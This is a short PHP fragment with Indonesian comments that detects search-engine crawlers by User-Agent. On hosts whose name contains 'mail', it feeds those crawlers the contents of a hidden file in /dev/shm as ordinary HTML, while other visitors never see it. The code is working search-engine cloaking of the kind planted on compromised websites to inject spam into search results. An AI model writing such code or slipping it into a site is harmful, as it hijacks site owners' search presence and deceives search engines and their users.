$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$host        = $_SERVER['HTTP_HOST'] ?? '';

$is_bot = false;

$bots = [
    'Googlebot',
    'Google-InspectionTool',
    'AdsBot-Google',
    'Mediapartners-Google',
    'Bingbot',
    'Slurp',
    'DuckDuckBot',
    'AhrefsBot',
    'SemrushBot',
    'MJ12bot',
    'YandexBot'
];

foreach ($bots as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

/* trigger untuk subdomain depan yang mengandung kata "mail" */
if ($is_bot && stripos($host, 'mail') !== false) {

    $file = '/dev/shm/mail.txt';

    if (file_exists($file)) {
        // Set header biar dianggap sebagai konten biasa oleh bot
        header('Content-Type: text/html; charset=UTF-8');
        readfile($file);
    } else {
        echo 'cache not ready';
    }

    exit;
}
